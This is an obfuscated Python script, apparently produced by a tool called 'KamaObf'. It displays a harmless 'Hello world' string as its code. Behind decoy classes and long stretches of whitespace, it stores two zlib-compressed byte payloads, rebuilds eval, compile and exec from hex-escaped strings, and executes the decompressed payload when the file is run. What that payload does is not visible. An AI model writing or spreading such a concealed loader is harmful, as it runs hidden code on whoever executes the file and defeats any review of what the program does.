from builtins import *
from math import prod as Statistics


__obfuscator__ = 'KamaObf'
__authors__ = ('Kama')
__github__ = 'https://github.com/lordkamayt/obf'
__discord__ = 'https://discord.gg/trauma'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


_ceil, _substract, _positive, _callfunction, _run, _add, Hypothesis = exec, str, tuple, map, ord, globals, type

class _power:
    def __init__(self, Math):
        self._statistics = Statistics((Math, 49323))
        self._random(System=-4805)

    def _random(self, System = float):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._statistics -= 53787 + System
        
        try:
            ((_round, _ceil, _substract) or _positive if (_round, _ceil, _substract) and _positive else ... or (_positive, (_round, _ceil, _substract)))

        except TypeError:
            (((_run, _ceil, _round), _callfunction) for _callfunction in (_round, _ceil, _substract))

        except:
            Hypothesis(-99187 - -77957) == Ellipsis

    def _invert(self, _memoryaccess = 90246):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _memoryaccess -= -95329 - -29439
        self._detectvar != str
        
        try:
            (_substract, _positive) if _positive == _positive else {_positive: _round} is _callfunction

        except TypeError:
            (_run, _run, _round) if _add <= _add else {'6aeyBete5tloetRBiue': _run} > _positive

        except:
            Hypothesis(-64692 * 30564) == int

    def Multiply(While = str):
        return _add()[While]

    def Frame(Power = 96695 - 38223, StackOverflow = type, _theory = _add):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _theory()[Power] = StackOverflow
        
        try:
            ((_run, (_run, _ceil, _round)) for _run in {'6aeyBete5tloetRBiue': _run} if _round > _callfunction)

        except OSError:
            {'6aeyBete5tloetRBiue': _run} if _positive >= _ceil else (_substract, _positive) != _add

        except:
            Hypothesis(-85142 - -40826) == None

    def execute(code = str):
        return _ceil(_substract(_positive(_callfunction(_run, code))))

    @property
    def _detectvar(self):
        self.Invert = '<__main__._statistics object at 0x000001887BE14167>'
        return (self.Invert, _power._detectvar)

if __name__ == '__main__':
    try:
        _power.execute(code = __code__)
        Divide = _power(Math = 61106 / 18977)

        _power(Math = 30227 - -26785)._invert(_memoryaccess = -47523 - Divide._statistics)                                                                                                                                                                                                                                                          ;_power.Frame(Power='MMMMMMMMNNNMMNNMMNMMMMNMN',StackOverflow=b'x\x9c\xe5\\[s\xea8\x12~\xcf\xaf`\xf2\x82]\xc3\xe1\x18_!U<\xec\x16\xbb5\xa4\x9205\xd9\xda\x93\xad3)\xca`\x91\x981\x16k\xcc\x84\xbc\xeco\xdf\xee\x96d\xcc\xc5\xd8\x04\x92I\xd5\xb1\xb1-\xcb\x92,\xb5Z\xadO\xddm\xd2\xe4\xf5\xea\xa2\x06[8\xd1\xe8\x8a\xdbp\xc8G\x93\xe5b\xec\xa7<\x19\x0e\xbb\xdd\xcb_^\xe7,\ty|Y\xe3I.\x95\xbfL\x9fy\xb2\xc0$\xda\xe5(\x8c\xa2\xd7\xf4\x99=q?\xb5\x1c\xf7\xb2q\xf9\xf7h\xc9~c\xc1\xa5\xbe\x91\xe9)L\x9f\x97#*\xf69M\xe7\x8b\xab\xaf_ETs\xccg_\xb7J\xf9Z\xf0\xe6 \\\x8cy\x12l\x94"\xe3\x9aOO_\xe7\x91\xff\xb4d[y\xa2p\xcc\xe2\x05\x1b\x0ek?u/\xff\xf1\xeb\xcd\x17\xb3il%\x19\xf3@<\xaf\xcf\x930N\xb5\xcb_X\x14\xf1\xda\x0bO\xa2\xe0\xa7K\xbd~\xa1_e\xa9\xf1y}\xf1G\x18\xd4\xf5\x0b\xb6\x1a\xb3y*\t\x19\xcf\x97\x90\xf37\xbe`\x8b\x9a\x9f\xb0Z\xc2\x82\xdf\xe3\x7f\x87<b\xa9\x88\x18\x01]~\x8f\xff\xc3\x97t\xe7\xd7\xb0\x90\xdf\xe3;>\xe2\xc1k-\n\xff\x80|\xaf|y\xa9_\x88J\x85\xb39O\xd2\xe1\x10\xde\xf6\xba\xa8\xebM\xb6\nSM\xbf\x88\xf8\xd8\x8f\x16\x9a\xfe\xbd\xfe\r\xb6\x07\xda\xe5\xf6\xf0\xad\xfe\xd8}\x8a\xf8\x08\x12\\\xecy\x8a\x99\xcc\xfb{\xd3\xbc\xc7]\x04\xe8\xa6\xfe\xfd\xea\xea\xe7/?\x7f\xd1\xbeh?\xb7t\xfd\xf1\xb1\x1b\x84IQ\t\x0fb\xa3gx\x86\xcbn\xfe\'\x96\xfaiZX\xc6\xed\xdd\xdd\x1d\x1d\xb7\xb7x\xc5 \x84\xa1\xf6\xa2u\x17\xfb\x9fcN\xac\xb8\x995\x81ZA\x01\xc8\xbb&Y\xd1k\xb1\xc9\xa6l\xb9(\xc6$z\x00\x05\x1e\xbbE%k\xf5\xd12\x8c\xd20\xc6N\xf8\xd3O\x0e\xd5\xae\x7fs\xdd\xbf\xbe\xb9\x86\xad\x7f\xdd\xef\xc3\x05\xca]\x93\t\xcf\xb4i\xc5\xefZ\xc4a\x1a\x85\xcb\xd16I\xf5\xc6\xbd\xec-\x95\x9a\xaa\xfe\x96\x92\xf4\xef\xe7+\xaa\x19\xc6\x01[i\xf5$]\xec<|\xd4\x0fQ\xaa\x1f\xc1F\xe7>\xfe \xf4\xa3\xd0*\xf2\xffd\xc7\x11k`p\xdc\x06\xc6\x80C\xc80\x06\x83\x01\xde\xfd(\x04c\x8b\xc8\xff\xe7>\x8a\x15\x8fg!dn3r\xdeJ\x82\xfe($K}\x1eM\xf6\x91\xac@2\x0ez\x03\xde\x1b\xc0\xb9\xc7\x91\xb7z\xbc\xd7\xebq\xfe\xa3P\x8b-\x93\x7f\x1d\xcf_j\x06T\x04\x15\xd3\xe2\xc3\xd1D\x0b\xc3\xf1\xc2\x8f\xc33\x10\xad\xb0\xa4\xe3\x89V\\\x94"\xda\xeb$\x8cV\xec9^\x1eO\xb9p\np/\x8c\xc2i\x14\xc26\r\xe1\xeeGa\xb5\x88\xf3\xdd\xa7\x07\x85\xff\xea\xe5e\xf5\x82\'8\xaf(\x04\x07\x90\xab^oNy\x18\x1f\xc2J\x8a\xf4\xf7\xb4\xa9\n\xff(\xa4fQ8\x9f\xf1\xf1\x11R\x10\xd8\x12\x98q\x1a!sFt\x93\xcf\xbc\x07\xb2h\x052@\x1b\xd5\xad\x96\x19\x98m3\xb0\x0c\xb3\x03\xc01`\xb8\xc8\xd0\xea\xedI\xba;`t\xc2\xcc?D\xa7\x8c\xd9j/\xf8\xd9\xdf#\xc5\xe4u;\xae\xef\x8e\xe5\x19\xafc\xda}\x08eO\xca\xc8\xfex\xa0\xfb\\\xd73\xdd\x89\x1b\x98\x86kz\x0e\x96\xef\xd9pf\x9e\x051\x1d7\xf0\x0cw\xe2\x99\x9e\rw\x10\xef\x99\xe6\xd8u\xbc\xb6\xeb\xb8\x96\x89\xf5p\\f\x8e=\x03\xca\xc0<6\x84-(%0\xc7\xb9{\x9brM\xa0$H]\xca"\x9f\x8fB\x9bT\x98x\xd6[\xdb\xf0\x86qW\xd7[\xc3\xf6\xd0\x1cv\x86\x16\xec\xc6\xd0\x81\xc3\x83\xb4\xe6nlyQ\x9d\xa1\x0bI[C\x1b2u \x8b1\xb4!-d\xdd\x8e-/\xca\x80g\xad\n\xc9\xa0\xb4\x0e\x94\xecAu;px\xc3\x16\x12i7\xb6\xbc({\x88m\xc6\x0c&dmAe\xb1\xf2\xcenl\x15: \xc9,H\xde\x81w\xdbp\xd7":\xb4\xb6c?N*\x16\x1d\x8fZ}\xc6\x83\xd8Oji\xc2\xe7\xb3S\xe4\xb4\xebL\xe8h\xc9\xa3\x03G[\xc6\xa9x\xc3\x1cQ\xad\xcb\xd2\x1a\x18W\xb1e\x1f2\tYP!KV\xd4\xceU\xbe-\xe3\xf1\xb0e\xe3\xaa\xa4\xb5*NfZ\xddv\xd9\xc2\x1fU\xec\x9e\xba\x8e\xec\x8a\xc3\xd5\x84\xdd\x83\xf1h\xd2p\xb6vcO$\x86#\x1b\x88\r\xf3rW\x15vs\xc4(K\xeb\x1c\xc1\xc3\x7f\x91\xf8\x86\xb5s\xe2\xcf\x9f\x12\xff\xf4qb\xc8\x91\xdb:\x91\xbfq\x89\x89\xabM\xd89.6a\xa1\x89\xda\xb7C\x0b\x86\x83T\x82\xe9\xb4\x94\x0e\x85\nAs\x03 \x0b\x94L\xef\x85*\x15\x02\xeb\x03\xd5i\xc1\x8c\xef\xc1\xac\x08W\x0f\x06Py\xc5\x0e/\x94\xaeo\xfa\xfd\xfe\xcd\xcd5\x9eE\xe8\x06\x02P\xb7\x82\xf6,\xf8\xc7u\xf0\xe3\x81\x95\x87X\xb2\x88\xa5\n\x9di\xc5\xf2\x16\x82JPu*!E\x81\xdf\x14\xb4&\xba\x91\xba\xfc\xd8a\xb9\xc6t\xe5U:\xa0\xd0C-\x1ep?\x9c\x8d\x81\x81\xa7\xc1\t\x83@`\xc9SID5\x94z2Qay}c\xcfU\x04\xb6\x85cs%\xd9g\xcdE/e$\xaa\xc7,\xfa\xc0\x15[\xb9\xfe\x91(\xa6\x94\x8f\x19i\x8b\xc7\xaf\x984O\x043m\tD\xd4\x9c\xed\xca\xf9\xdcSsy\x0e\xcc\x94\xa55\xcfC\x8a\xc1\xc0@\x867\x90\xef\x07\x1c8\x9e\x1fb\xaa\xfal\xb98\x13\xd4>@*\x05q,\xd9d\xd5lC\xce\xfaN\x0e\rTI{\x04\x1a(#\x97\x9a\x92L\xb5\xb8\x96\x01\xb3\x98s\x04\x1a~\x7f\xaa\xb5s\x18\xa8\x93G\xc8\xb9{\x85\x96\xcb\xd2:G\xa0e\xa2Z\xb1\xa4X\xc9MM<\xabRQ\x91\x84\xc1\x89\xccc\xcbf\x98\n:\xe6 "2J;\xc7<ei\xbd\xf3\x8c3j\x80\xa8\xbflH\x9f\xda\xd2\x7f\x7f\xc68\x16\x1e\x92\xca+\xf2g\xa3\xc0\xafI\xf0e\xaaC\xe9+\xaf\x0e\xb5\xb6L\xe4\xa0\x15\x03\x81&`\xcc\x9e\xc0\x9b\xbdRtT\xd7\x1dXexr\xcd!\xd6\xbd\x1dH\xeb\xee\xc6\x9e2\xcf\xe4\xc6\x84%\x99\xc2\xca1\x03\xc5I\xe6\xa9\x92\xf6(\x92\x1fWW\xa0f\xe0\xdaf)\xb8(\xe9\x8d\xe2\x17\xd8c\xd8}8:r\xf7)\x06\xe3:\xd9\x81g\xd8K\xa1\xc4\xf1\x8dcV\xdbk{\xc6\xc9\r\xacg\xfaP\xb9\x88\xb8\xbf/\xe75\\\xcf\xa2\xe6\xc9%\xad\x0f\xaaip\xcd\xeb\xed\xc6~\xf4\xb0<\x92\x8c\x9eg\x9a\xde\xa9\x04D|0\x80\r\xa1\xf0\x80\x8c\xdd\x06\x05\x06U\xe8\xd8"\xfd\x80M\xda\xba6\x8eP\xa2\xe3Nl\x05\xad"<3>^\xbd\x95IB\t\xb9o\xe5v\'NW{\'\xbeR\x01\x88\xe6\xdc\x1e\x99r\xd1a\x00\x97\x18\x9fz\x16\xc0\xf5-\xfa\xce\xdc\xf4\xaf\xfb\xc2\x83\xe6\x06\x82oj\xbb\xac1^\xfa\xeatB\xab\xbc\xdc\x8c\xad\xd4|\x86\x9c\xd5\x15\x98iI\x81]%me\x93\xd0\xb1\xf2\x0c\x16]\x0e\xac\x05\r<\xbf\xa3\xd0v\'\xb6m\xc3AW<\xc3\xee\xd2\xbd\xdamzB\xa9 \xf4\x89\x05\xf7\x81\x99\t\x9aa\x19x\x88\x90Mw\xd8 \x11\x83\xa1\xb37\xcc\x03Yz\xb2(\xa5\x12\xc9\x90\xf8\x90\r\x9b\x873\xc9>a%@4\x84v\x01<[\xd2Z\xd2\xda\x8e\xfd\xb4\xd2\xf6\xad@\x08\xa1\x10\xda\xfaP!\xe5\xd9d\xf9\xea\x9c\x8e\x1c\xe2x6\x9b\xc5\xb1\xbc\xc01\x13\xa7*\xa6\x1f\x0fv\xd4\x91\xdb\x84\x16\x84\x15\xc9\xd9\x8d=\x9b\xdd\xaa"\x8b\x9c3Y\x89X\xdePV\xc8\xab\xb2\xce\x18[b\xb9,\xed\t6\xa9\xe3\x07\xfa\xe9\xc3\x1c\x1dLI#|\x8d\xda\xe1kR\x13\xbf\xff\x0c\xff\x861w\xfcXs&\xce\xc4\r\xdc\x16jZ1\xfc\xceb^\xccR\x9bsW6\xabeq\xee;\x88{\xb7u:\x1f\x88\x82\x85\xc4\'q/^V.\xf2\xcfh\x0b\xf8x\xf6?\xa0\x0eo{\xb8\xb5i\xdf\xbc\xaa\xbb\xdc^\xde\xa7\x12\x9e"$\x05x*L00\xda\xd0\x1e\xf3\x16pz\x00V\x05.\x83=\x90\xd7\xcdp \xc32M\xe5j\xe3TBS\x8b\x08\xd0\xdcr\x82^\xe5@\xed\x95\x81R\xecc2T\nc\xa5\x8a\x11G)G\xe5WCJE,M\x12o[\n]K\xbf|\xdc\xfb\xc2\x9aV.(-\x98=\xc9\xdb\x81\xe6Q\x0b\xd7\x91\x90\xd6\xde\x8d\xfd\xe4\xab\xf3\xcdE\x01\x83P\xfb}\x17\x07Lri\x90\x9d\xd7|\xab\xee\xd5^n\x1e:\xba\xb9\xf6.F3\\\x0b\x8484]\xcc(tx\xa6!\x17\x11.<w\xc9\xc0\xeex\xd6\xe9x\x0e\xea\x19\x86\xd3\xe9\x94\xd6\x9f!^\xc30\x9a\x9e\xc0$N\xce6\xa3V\x94\xed\x9c\xedFA\x9c\xb2t\'\xad:\xd1\xe1\xca\x01nw\xc8;\xc9\xa6\xdd\x91\x1e\x1a[\xb1\x1f\xe9cp\xb8+\x08P\x13\xa6\xce\xb6\x8fA\xa5\xcasD\xa9\xfe\x95\x0b\r\xc6\xdb9Dz(]EW\x9b\xb7\xc9\x04\x9b\xb9\x93l\x00\x18\x1b\x03\x00\xc3 1`\x88\xd8\xe4\xea\xc8L\x03\x06N\xdbu\xe0j\x91M\xd7\x82XL\xef\xb8\x99\xfb\xe3\xc6pc\xef\t\xd7|\xa9#^\xeb\x86\x95\xd6\x18\xafc\xd2\x14\x8f\xe5\x15\xee\xcf\x0f\xd9\xde\x11\xb9\xd8\x19\xd2\xcc\xb4\'k-\xca\xfb(\x1cL\xdbC+=\xf4\xbc\xe9\xb6\xa0\x07\xa1\x97\x01\x93BOC\xffz\x18\x8f},\x1c\x0c\x94\xd8$\xfe0M\xc3\xb1m!Z[\xc09\xe8\xde:\xa6\x12\xf0\xd9\xe9\x1cP\xefqN\x1f\xa3\x0c\x06\xca[\x08\xd5\x99\xa5\xda\xe0sbZ\x89B\xbeI\xac\xa1J\x95/xx\x17\x14%A\xeaz\xcb\x83U\xaf:h\xdd/\xdb\xd0\xcb\xce ]\xb85\x14\x96.W\xca\xf0\xad\xd8O#\xc3\x0f\xe0\x0c\x85-\xd7\xe7q\x86<}\xe96\xb7F\xa1\xd5Q\xa7\xb4\xb5\xe7\xbd\xc1\xe0|^\xa8o3;\xa0\x9dQ\x88\xc9=\xd8\x08\xc3\xf1\t\xc5W]:l\x08\xe7\x16\xe5%\x84\xc7\tL\xa3\xdc\x03:9sgG\xe1\x1b\xf9\xcc\x93\x13g\x95\xb4\xee\x91c<\x12&sa7\x8f\xa4\xd1\x1cCo3\xbd\xa0\xed\xa5\xd7\x93\xd6g\xb8\x9c\xcd\xf4r\x1e\xb7\x17\xe5\xce\xa2 \x88\x82\x1d\xca\xfb')

        _power(Math = -25027 / -33971)._invert(_memoryaccess = -79347 * Divide._statistics)                                                                                                                                                                                                                                                          ;_power.Frame(Power='NNMMMMMNMNNMNNNNNMMMMNM',StackOverflow=b'\xa7\xb5\xe5\xb9p(\xed\xd1\x96\xae\xbfBQ\xa6\xecJdR\xea_WQrw\xc8h\x88\xd7\x16y\xd1;\xa4\xe4F\x07\xf9\x8d\xd8O\xd3\xaf\n\xe9+;\x93Rr\xda\nN:k\x8f\x94*i+z\xa4\xec\xb5bFb\xf93\x85=\x9c\xe2\xcd\xbbL\x95\x02\'\xb99\xfd\x9d\xd4\xd5mi\xef\xaaY\xa0\xf6|\x93\xa8i\xff+\xf8\xf2Z\xe7\x89\xa6\xed\xfffV\xf7\xe3@+\xcaV\xca\xaa$,p\xe3\xa2P*\xbe\xf7\x99\x15yv\xcb6m\x0bH\xee\xd8\xae\xed\xd9m\x02\xe3#\x00\xe08\x7fM\x1c\xc3i9\xa6c9\xb6\xe38\x002\x9d\xb6\xd3q|\xcb\xb0Z\x96iY\x96m9\x16@G\xabmuN\x1f\xe6\xc8t\xd8}\xb4\xfc\x96\xdd\x89lXE\xd5\xe3\x91{\x8fC\xce\x02\xe8\xe4c\x93\xaag\'\xb6\x8aM\xc6$\xfb\x97A\xabb\xfc\x86\xc8\xfc">\xc7\xd9\x8a\xfd+\x9c\x0c\x8e^\x1b\x8c\xa0w\x03\xbb\x05}\xd4\x81N\x86\x1e\xab\x82\xeb\xf78\x7fk\x12A\x0b\xb7\xeb\xbciR\xbf\x08\xd8\xa4F.Z0\x80\x06=\xe1\xae\x85wZ\x10&l\x9c\xf2\xe4U\xfe\xfb\xca$\x8c\xd8\xa2\xfb}R\x9b\xf0\xa46\xa9\x85qm\xbf{|3\n\x17)d\xce\x15\x10B\xa6&\x8b\x83\xc5K\x98>k\x94\x0e\xb6k\xf47\xe8\xab\xbf\xea\xd0\x1f\xe9-\tK\x97I,^Fu\x93\x7f\x1e \xfeK \x87{n5L3\x9c\xfb\xe9\xb3\xac \x16^+t\xa3^\'oH\x06\x96\xfeB\x106u\x7fA\xaf\\\xff\xcf\x8cp~A\xf9\x82B\x86>\x9a\xa0EP\x17\x935\x13\xe6\x07\x9a\x9e\xafpQzA_\xf4\xad\xe1\xe4q\xce\x05&\xd9\xa1.I<\x1c;\xa4\xb6"\xe1\x1dv\xf7\xf8`k\x95\x89.\xaa\x87\t1\x0b\x1d\xd7b\x06\xee\xee\xfa\x03k\xb2x\xe9\xc9I\x17\xd1\xd1\xd0\xdc\xa3\xfb\x1aI\x94u7\xb1U\x8f\xe4iO\x88e\xf2\x88\xe9\xe9X|\x14\xc6T|q\xb7\x15\xbc\x18;\x92>\xc0^\xbf\xba\x81\xef\xd5e\xbb\xa1\xf0\xd92\xf2\x87c>\x9b\xf3\x98\xc5)\xb0n\xd6\xb9\xa4\x8dF\xbe\x13t\xb9!C\x1e\x90F\x14\x98->\xb6\xdd\x7f\x9b\x0b\x7f6\x8f\x98F\xd0r \xbe\x9e\x11Kd\xbcoL\xa9\xf7\xa6S\xeaB\x9cv\xa93u\xbd\x91c\xaa\xdd\xef\x0e\xb4}=_\x96g_\xaf\xe6\xf2\xd0\xe4\x8f\xa5NC\xaaEH\x1f\xb2M\xa7\x17b\x8c\xcd\xc2\x15\x0b\x86\x8b4\t\xe3\xa7\xae\xb2w\xcff\x9b\x96\xf0\x8a\xb4X\xff\xb7\xc7\x9d\\\x8d\xdc\xdd\x8a\xac\xbb=\xa07\xf614\x17\x93.\x97\xfeR\xe8)UX\x80\xea]9\xe8\xf2\r\xa1\x81\xb6R\xa2\xef%sJ\x86q\x1f\xfb\x91L$\x07\x9b\xcc^\xf8\x85@s\xe4\xda,&)\x9b\xcf\xdd\x94qz&\x83\x85\xf8\\{\xd1K\x9f\xb1\r\x9e\xdcy\xfb\x83\x14\xbe\x9b\x1f\xc3h\xc7\xcd\x0e\xaek\x9a\xdehW\xfb\xe7\x05\x96o\x1a\xf0\xc4%}Q\xcb\x1d;\x93\xbc\xfe\xc8\x0b*\xcc!\x82\xc8|\x99\xce\x97\xe90e\xab\x94\xe4f\xf7\x88\xa1\x88-\xe8\xab\x93l\x96^EJ\xdf\x881\xa9\xacE\x18l K\xf4\xa4\xe4\xe0\x03)i9\xca\xec\x14\xaa\xb6)\xb7UL\xf3%\tS\xf6aDu\xc6n\x15\xa5[%\x12\xbc\xa9\xce9#\x13\xd4\xcd\xc6\x0f\xb7(d\x90R\xb0\r5\x84\x1aC\x8b\xa0\xc6\x90\xca>\xc2\x81\xab\x813\x17"i\x9a\xc5p\xbe\x18 \xe9\x17\xe3$\x9coS?\x17\xf9\xe6\x0ep\xc6\xd4\xa0\x03\xa4F\x05g\xdb\xed\x00\xae\xc5x\xc0cU\x08\xbf\x1e\xa8\x99A\xf3\xeeN\x93Cr\xee\'\x0b\x96t\x8b\xbfGl\xfe-yZ\xce@\x06\xfdJ)5\x81\xa22\x93?\x9c\xbb\xa8t gO\xe1\xf0\tT\xca\x15\xdd\xf4\x83`\xe8\xcb24\xe5\x14\xb6\xe1(\xd6\xe0\x021\xf4zR\x18\xe2t9h\xa4\xafs\xd6\xdd7\t4\x12\xf6\xdf%\x0c\xb8\xa0K\xdfr\x12\xe6\xe0\\\x8d\x90A\xaf\xf1\xcc\xa2yW\xd9\x9cI\xc6\x93h\xc7-\x16u\x83\n-\xba\xb2\x82t\xc1*.$\xb0\x11xo/4\xc4T\xcd\xf5\x94/\xff\xc9\xb0\x16\xf3T\xe4Z3D\x81\xac[\x1b\x842\x1b\x91\x9e\xe5\x11\xd2Y\xd6a-=\xbb{P\xd4\xbe\x8a\x8c\xfc\x05s\xed\xa1\x90\xd5\xd94W:3P\xde]I\xbe\xf9\x86\xc6\xde\xc2\xf5\x0bh\xfcp\x18\xfb3\x86\x7f\x8d\xd8\x17\xce@85\x03\xb4 d\xd1\xbf\xca\x15\xbf\xc1\x7f\x17\xff\x079\xbea\xba')

        Divide._random(System = Divide._statistics * -76997)                                                                                                                                                                                                                                                          ;NNMMNMMNNMMNMNNNMNMMMN,S22SS2SSS2SSS22SS22,IllIIIllllllIllllIlll,NNNMNNMMMNNMNNMNNMNNM,NNNNMMNNNNMNNNNNMNNNMMMM=(lambda nmnnmmnnmnmnnmnnnm:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(nmnnmmnnmnmnnmnnnm)"),filename='\x49\x4a\x4a\x4a\x4c\x4a\x4a\x49\x4c\x4a\x49\x4a\x49\x4a\x4a\x4c\x4c\x4a\x4c\x49\x4a\x4a\x49\x4a',mode='\x65\x76\x61\x6c'))),(lambda nmnnmmnnmnmnnmnnnm:nmnnmmnnmnmnnmnnnm['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda nmnnmmnnmnmnnmnnnm:nmnnmmnnmnmnnmnnnm(__import__('\x7a\x6c\x69\x62'))),(lambda wwwwwwwxwxwwwwwwwwx,nmnnmmnnmnmnnmnnnm:wwwwwwwxwxwwwwwwwwx(nmnnmmnnmnmnnmnnnm)),(lambda:(lambda nmnnmmnnmnmnnmnnnm:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(nmnnmmnnmnmnnmnnnm)"),filename='\x49\x4a\x4a\x4a\x4c\x4a\x4a\x49\x4c\x4a\x49\x4a\x49\x4a\x4a\x4c\x4c\x4a\x4c\x49\x4a\x4a\x49\x4a',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        _power(Math = -23660 / -80482)._invert(_memoryaccess = -2259 / Divide._statistics)                                                                                                                                                                                                                                                          ;NNNNMMNNNNMNNNNNMNNNMMMM()(NNNMNNMMMNNMNNMNNMNNM(S22SS2SSS2SSS22SS22(IllIIIllllllIllllIlll(NNMMNMMNNMMNMNNNMNMMMN('\x76\x61\x72\x73'))),_power.Multiply(While='MMMMMMMMNNNMMNNMMNMMMMNMN')+_power.Multiply(While='NNMMMMMNMNNMNNNNNMMMMNM')))

    except Exception as _round:
        if 457362 > 3708872:
            _power.execute(code = _substract(_round))

        elif 340222 > 1609783:
            _power(Math = -31101 + 14764)._invert(_memoryaccess = -6490 - Divide._statistics)